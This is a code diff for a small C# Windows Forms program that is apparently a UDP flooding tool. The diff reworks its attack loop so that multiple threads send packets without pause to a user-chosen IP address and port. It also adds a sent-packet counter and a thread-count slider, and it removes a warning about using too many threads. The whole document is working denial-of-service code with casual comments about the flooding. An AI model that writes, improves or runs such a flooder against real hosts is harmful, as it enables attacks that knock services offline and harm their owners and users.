@@ -15,6 +15,9 @@ namespace wpfVer2
     public partial class Form1 : Form
     {
         public bool active;
+        public static int UDPsent = 0;
+        public static int UDPport;
+        public static string UDPip;
         public Form1()
         {
             InitializeComponent();
@@ -36,6 +39,7 @@ namespace wpfVer2
             {
                 MessageBox.Show("Flooding started.");
                 active = true;
+                UDPsent = 0;
                 floodSetVar(); // this sets the variables and opens threads
             }
         }
@@ -47,11 +51,18 @@ namespace wpfVer2
                 try
                 {
                     client.Connect(ip, port); // this is where the fun starts
+                    UDPport = port;
+                    UDPip = ip;
+                    UDPtrack udpt = new UDPtrack();
+                    udpt.Show();
                     byte[] sendBytes = Encoding.ASCII.GetBytes(message); // i don't actually know what to put here so i just put a simple http get request
                     client.AllowNatTraversal(true);
                     client.DontFragment = true;
-                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
-                    flood(ip, port, client, message);
+                    while (active)
+                    {
+                        client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
+                        UDPsent++;
+                    }
                 }
                 catch
                 {
@@ -66,10 +77,6 @@ namespace wpfVer2
             int por = Int32.Parse(portText.Text);
             string message = messageText.Text;
             int threads = Int32.Parse(threadText.Text);
-            if (threads > 32)
-            {
-                MessageBox.Show("WARNING: Too many threads could cause problems if an error occurs. Proceed with caution."); // idk how many threads is too many but i think 32 might be it
-            }
             UdpClient client2 = new UdpClient(ipaddr, por); // this is just the udp client, nothing interesting
             for (int i = 1; i < threads; i++) // this opens all the threads
             {
@@ -80,6 +87,12 @@ namespace wpfVer2
         private void stop_Click(object sender, EventArgs e)
         {
             active = false;
+        }
+
+        private void trackBar1_Scroll(object sender, EventArgs e)
+        {
+            int j = trackBar1.Value;
+            threadText.Text = j.ToString();
         }
     }
 }
